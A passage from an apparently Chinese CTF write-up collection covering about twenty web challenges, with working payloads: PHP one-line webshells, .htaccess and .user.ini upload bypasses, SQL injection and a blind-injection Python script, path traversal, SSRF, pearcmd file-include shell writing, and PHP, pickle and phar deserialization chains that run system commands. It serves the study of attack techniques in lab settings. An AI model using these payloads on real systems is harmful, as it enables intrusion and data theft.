[0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;.user.ini&quot; [3]=&gt; string(5) &quot;1.jpg&quot; [4]=&gt; string(9) &quot;index.php&quot; &#125; 对于nginx 上传.user.ini文件 它可以使我们对目录中的任何一个文件访问时 都调用.user.ini文件中指定的类型对其进行读取 注意该文件也需要加文件幻术头 12GIF89aauto_prepend_file=1.jpg 然后蚁剑即可然而蚁剑连不上这里使用的方法是 注意最后一定要带分号 否则无法执行 1index.php?nene=system(&#x27;cat /flag&#x27;); 17、[GXYCTF2019]BabyUpload应该又是一道文件上传的题目一句话 12GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[nene])&lt;/script&gt; 直接上传php文件时 1上传类型也太露骨了吧！ 上传phtml文件 1后缀名不能有ph！ 则应该需要辅助上传文件随便输一段url 看看服务器类型 1Apache/2.4.10 (Debian) Server at f8939c1f-6a09-486e-b9eb-0e5198a5f3bd.node5.buuoj.cn Port 80 apache则 用.htaccess上传时修改content-type为 1image/jpeg 则上传成功然后直接用蚁剑连接即可 18、[GXYCTF2019]BabySQli有用户名和密码登录框 仅对密码部分进行修改 11&#x27; 回显 1wrong pass! 可能存在关键词过滤 fuzz一下fuzz完发现在password里所有的关键词全被过滤了试试username发现username是存在注入的当username只输入 1&#x27; 回显 1Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27;&#x27;&#x27; at line 1 if we try the payload below 1&#x27;union select 1,2%23 # 回显 1Error: The used SELECT statements have a different number of columns add one more column 1&#x27;union select 1,2,3 %23 return 1wrong user then we can confirm that there are 3 columns in totalpayload to get the table names 123&#x27; union select 1,2,group_concat(table_name)from information_schema.tableswhere table_schema=database() %23 however it gives us this in return 1do not hack me! 联合查询会将数据插入到表中 利用这个机制 我们可以新建admin账户来登录admin尝试payload 1&#x27; union select 1,&#x27;admin&#x27;,3# 提示wrong pass， 说明用户名是正确的接着通过联合查询新建密码 并登录发现还是不行尝试上传密码的md5值 成功 19、[GYCTF2020]Blacklistsql注入加blacklist 想到预编译和handler先测试注入点 11&#x27; or 1=1 # 回显 1234567891011121314151617181920array(2) &#123; [0]=&gt; string(1) &quot;1&quot; [1]=&gt; string(7) &quot;hahahah&quot;&#125;array(2) &#123; [0]=&gt; string(1) &quot;2&quot; [1]=&gt; string(12) &quot;miaomiaomiao&quot;&#125;array(2) &#123; [0]=&gt; string(6) &quot;114514&quot; [1]=&gt; string(2) &quot;ys&quot;&#125; 爆库 11&#x27;;show databases;# 爆表 11&#x27;;show tables;# 发现flag 123456789array(1) &#123; [0]=&gt; string(8) &quot;FlagHere&quot;&#125;array(1) &#123; [0]=&gt; string(5) &quot;words&quot;&#125; 预编译payload 11&#x27;;prepare nene from concat (&#x27;s&#x27;,&#x27;elect&#x27;,&#x27;* from `miaomiaomiao`&#x27;);execute nene;; 预编译也被过滤了 1return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i&quot;,$inject); 那就handler 11&#x27;;handler `FlagHere` open;handler `FlagHere` read first;handler `FlagHere` read close; 得到flag 20、[CISCN2019 华北赛区 Day2 Web1]Hack World注入检测 先随便输几个 1SQL Injection Checked. 看来不是报错注入 那就是bool盲注已知 123### All You Want Is In Table &#x27;flag&#x27; and the column is &#x27;flag&#x27;### Now, just give the id of passage python脚本 12345678910111213141516171819202122232425262728293031323334import requests url = &quot;http://ece36d87-bdcb-4e2c-83dd-d78a86059e51.node5.buuoj.cn:81/index.php&quot; result = &quot;&quot; num = 0 # 用了来判断是不是flag已经拼完整了 for i in range(1, 60): if num == 1: break for j in range(32, 128): payload = &quot;if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)&quot; % (i, j) # print(str((i-1)*96+j-32)+&quot;:~&quot;+payload+&quot;~&quot;) data = &#123; &quot;id&quot;: payload, &#125; r = requests.post(url, data=data) r.encoding = r.apparent_encoding if &quot;Hello&quot; in r.text: x = chr(j) result += str(x) print(result) break if &quot;&#125;&quot; in result: print(result) num = 1 break 代码解析 关键部分就在payload 其余都很好理解 1payload = &quot;if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)&quot; % (i, j) i为flag的第i个字母j为可见字符的ascii值因为是已知flag表中的flag列 因此select flag from flagsubstr函数用来截取字符串其用法为 1SUBSTR (str, pos, len) str为字符串 即flagpos为起始位置len为截取字符个数因此这个函数的意思就是选择flag的第i个字母转化为ascii值后再执行ifsql中if的用法 1IF( expr1 , expr2 , expr3 ) 当expr1为true时 返回expr2false 返回expr3这也是为什么后面要判断hello是否在回显结果里说了id 因此请求头的id放payload 当然也可抓包再看 21、[RoarCTF 2019]Easy Java给了一个登陆页面 还有一个helphelp点进去后 1java.io.FileNotFoundException:&#123;help.docx&#125; 查看源代码 发现help对应的源代码 1&lt;a href=&quot;Download?filename=help.docx&quot; target=&quot;_blank&quot;&gt;help&lt;/a&gt; 由java web相关知识 12345/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在.jar文件中 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件 /WEB-INF/database.properties：数据库配置文件 则构造payload 接在url后面 1/Download?filename=WEB-INF/web.xml 不行 则更换post方法 下载成功 发现源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot; version=&quot;4.0&quot;&gt; &lt;welcome-file-list&gt; &lt;welcome-file&gt;Index&lt;/welcome-file&gt; &lt;/welcome-file-list&gt; &lt;servlet&gt; &lt;servlet-name&gt;IndexController&lt;/servlet-name&gt; &lt;servlet-class&gt;com.wm.ctf.IndexController&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;IndexController&lt;/servlet-name&gt; &lt;url-pattern&gt;/Index&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;servlet&gt; &lt;servlet-name&gt;LoginController&lt;/servlet-name&gt; &lt;servlet-class&gt;com.wm.ctf.LoginController&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;LoginController&lt;/servlet-name&gt; &lt;url-pattern&gt;/Login&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;servlet&gt; &lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt; &lt;servlet-class&gt;com.wm.ctf.DownloadController&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt; &lt;url-pattern&gt;/Download&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;servlet&gt; &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt; &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt; &lt;url-pattern&gt;/Flag&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;&lt;/web-app&gt; 找到flag的位置构造payload 1/Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class 在下载的文件中找到一串base64加密后的字符串 （因为是等号结尾 1ZmxhZ3swYWZkMTE1NC1jNTE0LTQzYTUtODY4YS02NjMxODkzMTg3ZWN9Cg== 解密后即得到flag 22、[网鼎杯 2018]Fakebook发现有robots.txt 访问 12User-agent: *Disallow: /user.php.bak 访问后得到源码的备份文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125; 可以看到注册时blog的填写必须要http开头的网址注册成功后点进去 发现url是 1http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=1 猜测no存在sql注入fuzz后发现select 和 union都没被过滤 猜测是空格被过滤 使用&#x2F; ** &#x2F;绕过联合查询爆出表的长度 并且知道回显位是2 同时发现存在反序列化 1http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select%201,2,3,4 继续获得数据库名称 fakebook 1http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select%201,database(),3,4 继续获得表名 users 1http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select%201,TABLE_NAME,3,4 FROM information_schema.tables WHERE TABLE_SCHEMA=database() 继续获取列名|no,username,passwd,data| 1http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select%201,GROUP_CONCAT(column_name),3,4 from information_schema.columns WHERE TABLE_SCHEMA=database() 获取字段 1http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select%201,GROUP_CONCAT(no,username,passwd,data),3,4 from users 回显 11adminc7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ecO:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:15:&quot;http://fasd.com&quot;;&#125;v 我们猜测flag也在报错的当前目录下 1/var/www/html/view.php 方法一：ssrf漏洞payload如下 因为data字段在第4个位置 1http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27; 在源码中发现了flag 12345&lt;!--?php$flag = &quot;flag&#123;1c940269-22ec-4be3-9486-e4a4d10e2474&#125;&quot;;exit(0);--&gt; 方法二：load_file函数payload 1http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4 同样能找到flag 23、[NewStarCTF 2023 公开赛道]Include 🍐题目代码 123456789101112&lt;?php error_reporting(0); if(isset($_GET[&#x27;file&#x27;])) &#123; $file = $_GET[&#x27;file&#x27;]; if(preg_match(&#x27;/flag|log|session|filter|input|data/i&#x27;, $file)) &#123; die(&#x27;hacker!&#x27;); &#125; include($file.&quot;.php&quot;); # Something in phpinfo.php! &#125; else &#123; highlight_file(__FILE__); &#125; ?&gt; 过滤了常见的文件包含协议 但是可以传入参数file使用file协议查看 1?file=file:///var/www/html/phpinfo 搜索flag 找到 1|fake&#123;Check_register_argc_argv&#125;| 继续查找register_argc_argv 发现两个on构造payload 使用burp抓包传参 1?file=/usr/local/lib/php/pearcmd&amp;aaaa+config-create+/var/www/html/&lt;?=`$_POST[1]`;?&gt;+nene.php 最后访问 1/nene.php POST方法传入参数 即可获得flag 11=cat /f* 24、[VNCTF2023]象棋王子查看源代码 发现有jsfuck加密复制下来 在控制台跑一下 即可 25、[NewStarCTF 2023 公开赛道]Begin of PHP题目源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;key1&#x27;]) &amp;&amp; isset($_GET[&#x27;key2&#x27;]))&#123; echo &quot;=Level 1=&lt;br&gt;&quot;; if($_GET[&#x27;key1&#x27;] !== $_GET[&#x27;key2&#x27;] &amp;&amp; md5($_GET[&#x27;key1&#x27;]) == md5($_GET[&#x27;key2&#x27;]))&#123; $flag1 = True; &#125;else&#123; die(&quot;nope,this is level 1&quot;); &#125;&#125;if($flag1)&#123; echo &quot;=Level 2=&lt;br&gt;&quot;; if(isset($_POST[&#x27;key3&#x27;]))&#123; if(md5($_POST[&#x27;key3&#x27;]) === sha1($_POST[&#x27;key3&#x27;]))&#123; $flag2 = True; &#125; &#125;else&#123; die(&quot;nope,this is level 2&quot;); &#125;&#125;if($flag2)&#123; echo &quot;=Level 3=&lt;br&gt;&quot;; if(isset($_GET[&#x27;key4&#x27;]))&#123; if(strcmp($_GET[&#x27;key4&#x27;],file_get_contents(&quot;/flag&quot;)) == 0)&#123; $flag3 = True; &#125;else&#123; die(&quot;nope,this is level 3&quot;); &#125; &#125;&#125;if($flag3)&#123; echo &quot;=Level 4=&lt;br&gt;&quot;; if(isset($_GET[&#x27;key5&#x27;]))&#123; if(!is_numeric($_GET[&#x27;key5&#x27;]) &amp;&amp; $_GET[&#x27;key5&#x27;] &gt; 2023)&#123; $flag4 = True; &#125;else&#123; die(&quot;nope,this is level 4&quot;); &#125; &#125;&#125;if($flag4)&#123; echo &quot;=Level 5=&lt;br&gt;&quot;; extract($_POST); foreach($_POST as $var)&#123; if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$var))&#123; die(&quot;nope,this is level 5&quot;); &#125; &#125; if($flag5)&#123; echo file_get_contents(&quot;/flag&quot;); &#125;else&#123; die(&quot;nope,this is level 5&quot;); &#125;&#125; 感觉可以大量使用数组进行绕过 注意GET&#x2F;POST方法前面四部分都可利用弱比较的特性 使用数组绕过最后一部分 extract函数的绕过方法 POST 1flag5=. 这是因为要求flag5参数的值不包含[a-zA-Z0-9]，即不包含字母和数字，用字符绕过即可。 26、[NewStarCTF 2023 公开赛道]include 0。0题目源码 12345678910&lt;?phphighlight_file(__FILE__);// FLAG in the flag.php$file = $_GET[&#x27;file&#x27;];if(isset($file) &amp;&amp; !preg_match(&#x27;/base|rot/i&#x27;,$file))&#123; @include($file);&#125;else&#123; die(&quot;nope&quot;);&#125;?&gt; nope GET传参获取file 应该是用php伪协议读取文件 过滤了base64和rot13两种方式那就使用十六进制 1?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php 27、[NewStarCTF 2023 公开赛道]R!C!E!题目源码 1234567891011&lt;?phphighlight_file(__FILE__);if(isset($_POST[&#x27;password&#x27;])&amp;&amp;isset($_POST[&#x27;e_v.a.l&#x27;]))&#123; $password=md5($_POST[&#x27;password&#x27;]); $code=$_POST[&#x27;e_v.a.l&#x27;]; if(substr($password,0,6)===&quot;c4d038&quot;)&#123; if(!preg_match(&quot;/flag|system|pass|cat|ls/i&quot;,$code))&#123; eval($code); &#125; &#125;&#125; 最终payload 1password=6O48A7ZyA0nskVwOIGCQ&amp;e[v.a.l=echo(`cd /;l\\s;more f?*?;`); 说明：password参数的要求：md5加密后前六位要满足c4d038e_v.a.l参数需要注意的地方：在POST的时候e_v.a.l中的.会被解析为_绕过方式：e[v.a.l这样[ 会被解析成_ 而后面的逗号不会被解析 28、[NewStarCTF 2023 公开赛道]Unserialize？题目源码 12345678910111213141516&lt;?phphighlight_file(__FILE__);// Maybe you need learn some knowledge about deserialize?class evil &#123; private $cmd; public function __destruct() &#123; if(!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd))&#123; @system($this-&gt;cmd); &#125; &#125;&#125;?&gt; 测试脚本 1234567891011121314151617&lt;?phpclass evil &#123; private $cmd=&#x27;ls /&#x27;; public function __destruct() &#123; if(!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd))&#123; @system($this-&gt;cmd); &#125; &#125;&#125;$a = new evil()echo urlencode(serialize(a))?&gt; 因为cat被屏蔽了 使用uniq可以绕过 1234567891011121314151617&lt;?phpclass evil &#123; private $cmd=&#x27;uniq /th1s_1s_fffflllll4444aaaggggg&#x27;; public function __destruct() &#123; if(!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd))&#123; @system($this-&gt;cmd); &#125; &#125;&#125;$a = new evil()echo urlencode(serialize(a))?&gt; 29、[NewStarCTF 2023 公开赛道]POP Gadget题目源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?phphighlight_file(__FILE__);class Begin&#123; public $name; public function __destruct() &#123; if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$this-&gt;name))&#123; echo &quot;Hello&quot;; &#125;else&#123; echo &quot;Welcome to NewStarCTF 2023!&quot;; &#125; &#125;&#125;class Then&#123; private $func; public function __toString() &#123; ($this-&gt;func)(); return &quot;Good Job!&quot;; &#125;&#125;class Handle&#123; protected $obj; public function __call($func, $vars) &#123; $this-&gt;obj-&gt;end(); &#125;&#125;class Super&#123; protected $obj; public function __invoke() &#123; $this-&gt;obj-&gt;getStr(); &#125; public function end() &#123; die(&quot;==GAME OVER==&quot;); &#125;&#125;class CTF&#123; public $handle; public function end() &#123; unset($this-&gt;handle-&gt;log); &#125;&#125;class WhiteGod&#123; public $func; public $var; public function __unset($var) &#123; ($this-&gt;func)($this-&gt;var); &#125;&#125;@unserialize($_POST[&#x27;pop&#x27;]); 脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183&lt;?phpclass Begin&#123; public $name; public function __destruct() &#123; if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$this-&gt;name))&#123; echo &quot;Hello&quot;; &#125;else&#123; echo &quot;Welcome to NewStarCTF 2023!&quot;; &#125; &#125;&#125;class Then&#123; private $func; public function __construct() &#123; $a=new Super(); $this-&gt;func=$a; &#125;//构造一个构造方法 来进行触发Super里面的__invoke()魔术方法 因为private（）函数原因 类的内部能够访问 但外部不能访问 public function __toString() &#123; ($this-&gt;func)(); return &quot;Good Job!&quot;; &#125;&#125;class Handle&#123; protected $obj; public function __construct() &#123; $this-&gt;obj=new CTF(); &#125;//构造一个构造方法 进入CTF的内部 因为protected（）函数原因 子类能够访问 但外部不能访问 public function __call($func, $vars) &#123; $this-&gt;obj-&gt;end(); &#125;&#125;class Super&#123; protected $obj; public function __construct() &#123; $this-&gt;obj=new Handle(); &#125; //构造一个构造方法 来进行触发Handle里面的__call（）魔术方法 因为protected（）函数原因 子类能够访问 但外部不能访问 public function __invoke() &#123; $this-&gt;obj-&gt;getStr(); &#125; public function end() &#123; die(&quot;==GAME OVER==&quot;); &#125;&#125;class CTF&#123; public $handle; public function __construct() &#123; $b=new WhiteGod(); $this-&gt;handle=$b; &#125; //自己创建构造函数 来触发下面的__unset()魔术方法 public function end() &#123; unset($this-&gt;handle-&gt;log); &#125;&#125;class WhiteGod&#123; public $func=&#x27;system&#x27;; //赋值来构造命令执行 public $var=&#x27;ls /&#x27;; public function __unset($var) &#123; ($this-&gt;func)($this-&gt;var); //出口函数 采用传参的拼接 可以执行命令执行漏洞 &#125;&#125;//pop链：__construct()-&gt;__tostring（）-&gt;__invoke()-&gt;__call（）-&gt;CTF()-&gt;__unset$k=new Begin(); //创建对象自动销毁触发__construct()魔术方法$k-&gt;name=new Then(); //触发__tostring（）魔术方法echo urlencode(serialize($k)); //url编码可以绕过私有属性和保护属性 或者采用%00来替补 最终payload POST方法提交 1pop=O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125; 30、[NewStarCTF 2023 公开赛道]EasyLogin爆破密码后得到密码是000000admin 000000 登陆成功抓包后发现302重定向页面在该页面发现flag 1234567891011HTTP/1.1 302 FoundDate: Wed, 31 Jan 2024 02:52:10 GMTServer: Apache/2.4.54 (Debian)X-Powered-By: PHP/7.4.30Set-Cookie: token=vyYcoj3oBPxcJynYjDB147AXacdZmh0kgkqJO9WvoHJ1aQtYOHBXIFfl1UbeoQucH6MgN5teTRk2ndV3Mwp0Ng%3D%3D; path=/Location: /Content-Length: 51Connection: closeContent-Type: text/html; charset=UTF-8&lt;!-- flag&#123;80287908-f5bc-44d8-aa80-3ec4ea9e331f&#125; --&gt; 31、[Dest0g3 520迎新赛]funny_upload.htaccess 注意上传的时候先上传.htaccess.jpg 再抓包修改名称 12AddType application/x-httpd-php .jpgphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=1.jpg&quot; 1.jpg 12PD9waHAgZXZhbCgkX1BPU1RbJ25lbmUnXSk7Pz4=# &lt;?php eval($_POST[&#x27;nene&#x27;]);?&gt; 之后蚁剑连接即可 32、[Dest0g3 520迎新赛]SimpleRCE无参数rce直接过 123POST：aaa=show_source(next(apache_request_headers()));User-Agent: /flag 33、[2022DASCTF MAY 出题人挑战赛]魔法浏览器在文档中发现 12let ua = &quot;\\x4d\\x6f\\x7a\\x69\\x6c\\x6c\\x61\\x2f\\x35\\x2e\\x30 \\x28\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73 \\x4e\\x54 \\x31\\x30\\x2e\\x30\\x3b \\x57\\x69\\x6e\\x36\\x34\\x3b \\x78\\x36\\x34\\x29 \\x41\\x70\\x70\\x6c\\x65\\x57\\x65\\x62\\x4b\\x69\\x74\\x2f\\x35\\x33\\x37\\x2e\\x33\\x36 \\x28\\x4b\\x48\\x54\\x4d\\x4c\\x2c \\x6c\\x69\\x6b\\x65 \\x47\\x65\\x63\\x6b\\x6f\\x29 \\x4d\\x61\\x67\\x69\\x63\\x2f\\x31\\x30\\x30\\x2e\\x30\\x2e\\x34\\x38\\x39\\x36\\x2e\\x37\\x35&quot;; console[&quot;\\x6c\\x6f\\x67&quot;](ua); 将utf-8转化为字符 或者 直接在控制台中输入 即可将utf-8字符直接转化为字符 1Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75 添加入浏览器的user-agent头即可 34、[DASCTF 2023 &amp; 0X401七月暑期挑战赛]ez_cms后台地址 1http://0baae324-999c-4467-afd4-d50da533a1e5.node5.buuoj.cn:81/admin/ admin爆破出密码123456pearcmd文件包含使用burp传参 直接夹在url后会因为url编码导致写入的一句话无法正常解析 1+config-create+/&amp;r=../../../../../../../../../../usr/share/php/pearcmd&amp;/&lt;?=eval($_POST[cmd]);?&gt;+../../../../../../../../tmp/1.php 之后蚁剑连接即可 1http://0baae324-999c-4467-afd4-d50da533a1e5.node5.buuoj.cn:81/admin/index.php?r=../../../../../../../../tmp/1.php 1flag&#123;9541dd35-dc88-493c-b5ae-ee4f61fe40d8&#125; 35、[Dest0g3 520迎新赛]middle题目源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import osimport configfrom flask import Flask, request, session, render_template, url_for,redirect,make_responseimport pickleimport ioimport sysimport base64app = Flask(__name__)class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module in [&#x27;config&#x27;] and &quot;__&quot; not in name: return getattr(sys.modules[module], name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load()@app.route(&#x27;/&#x27;)def show(): base_dir = os.path.dirname(__file__) resp = make_response(open(os.path.join(base_dir, __file__)).read()+open(os.path.join(base_dir, &quot;config/__init__.py&quot;)).read()) resp.headers[&quot;Content-type&quot;] = &quot;text/plain;charset=UTF-8&quot; return resp@app.route(&#x27;/home&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def home(): data=request.form[&#x27;data&#x27;] User = restricted_loads(base64.b64decode(data)) return str(User)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, debug=True, port=5000)import osdef backdoor(cmd): # 这里我也改了一下 if isinstance(cmd,list) : s=&#x27;&#x27;.join(cmd) print(&quot;!!!!!!!!!!&quot;) s=eval(s) return s else: print(&quot;??????&quot;) pickel 反序列化payload 12345678import osimport configimport pickleimport sysimport base64opcode = b&#x27;&#x27;&#x27;(cconfig\\nbackdoor\\np0\\n0g0\\n((S&#x27;__import__(\\\\&#x27;os\\\\&#x27;).popen(\\\\&#x27;cat /flag.txt\\\\&#x27;).read()&#x27;\\nltR.&#x27;&#x27;&#x27;print(base64.b64encode(opcode)) 参数 1KGNjb25maWcKYmFja2Rvb3IKcDAKMGcwCigoUydfX2ltcG9ydF9fKFwnb3NcJykucG9wZW4oXCdjYXQgL2ZsYWcudHh0XCcpLnJlYWQoKScKbHRSLg== 36[2022DASCTF Apr X FATE 防疫挑战赛]warmup-php题目部分源码 123456789101112131415161718192021&lt;?phpspl_autoload_register(function($class)&#123; require(&quot;./class/&quot;.$class.&quot;.php&quot;);&#125;);highlight_file(__FILE__);error_reporting(0);$action = $_GET[&#x27;action&#x27;];$properties = $_POST[&#x27;properties&#x27;];class Action&#123; public function __construct($action,$properties)&#123; $object=new $action(); foreach($properties as $name=&gt;$value) $object-&gt;$name=$value; $object-&gt;run(); &#125;&#125;new Action($action,$properties);?&gt; payloadGET参数 1action=TestView POST参数 1properties[template]=&#123;TableBody&#125;&amp;properties[rowHtmlOptionsExpression]=var_dump(system(&#x27;/readflag&#x27;));&amp;properties[data]=1 37、[2022DASCTF Apr X FATE 防疫挑战赛]soeasy_php（不会）考虑存在任意文件读取POST如下参数 1png=/var/www/html/upload.php&amp;flag=1 然后从&#x2F;upload&#x2F;head.png下载图片以文本打开 即可获得源码upload.php页面源码 1234567891011&lt;?phpif (!isset($_FILES[&#x27;file&#x27;])) &#123; die(&quot;请上传头像&quot;);&#125;$file = $_FILES[&#x27;file&#x27;];$filename = md5(&quot;png&quot;.$file[&#x27;name&#x27;]).&quot;.png&quot;;$path = &quot;uploads/&quot;.$filename;if(move_uploaded_file($file[&#x27;tmp_name&#x27;],$path))&#123; echo &quot;上传成功： &quot;.$path;&#125;; edit.php页面源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phpini_set(&quot;error_reporting&quot;,&quot;0&quot;);class flag&#123; public function copyflag()&#123; exec(&quot;/copyflag&quot;); //以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt echo &quot;SFTQL&quot;; &#125; public function __destruct()&#123; $this-&gt;copyflag(); &#125;&#125;function filewrite($file,$data)&#123; unlink($file); file_put_contents($file, $data);&#125;if(isset($_POST[&#x27;png&#x27;]))&#123; $filename = $_POST[&#x27;png&#x27;]; if(!preg_match(&quot;/:|phar|\\/\\/|php/im&quot;,$filename))&#123; $f = fopen($filename,&quot;r&quot;); $contents = fread($f, filesize($filename)); if(strpos($contents,&quot;flag&#123;&quot;) !== false)&#123; filewrite($filename,&quot;Don&#x27;t give me flag!!!&quot;); &#125; &#125; if(isset($_POST[&#x27;flag&#x27;])) &#123; $flag = (string)$_POST[&#x27;flag&#x27;]; if ($flag == &quot;Give me flag&quot;) &#123; filewrite(&quot;/tmp/flag.txt&quot;, &quot;Don&#x27;t give me flag&quot;); sleep(2); die(&quot;no no no !&quot;); &#125; else &#123; filewrite(&quot;/tmp/flag.txt&quot;, $flag); //不给我看我自己写个flag。 &#125; $head = &quot;uploads/head.png&quot;; unlink($head); if (symlink($filename, $head)) &#123; echo &quot;成功更换头像&quot;; &#125; else &#123; unlink($filename); echo &quot;非正常文件，已被删除&quot;; &#125;; &#125;&#125; phar文件内容 123456789101112131415161718192021&lt;?phpclass flag&#123; public function copyflag()&#123; exec(&quot;/copyflag&quot;); //以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt echo &quot;SFTQL&quot;; &#125; public function __destruct()&#123; $this-&gt;copyflag(); &#125;&#125;$a = new flag();@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($a);$phar-&gt;addFromString(&quot;a.txt&quot;, &quot;a&quot;);$phar-&gt;stopBuffering(); 然后通过添加脏数据触发unlink 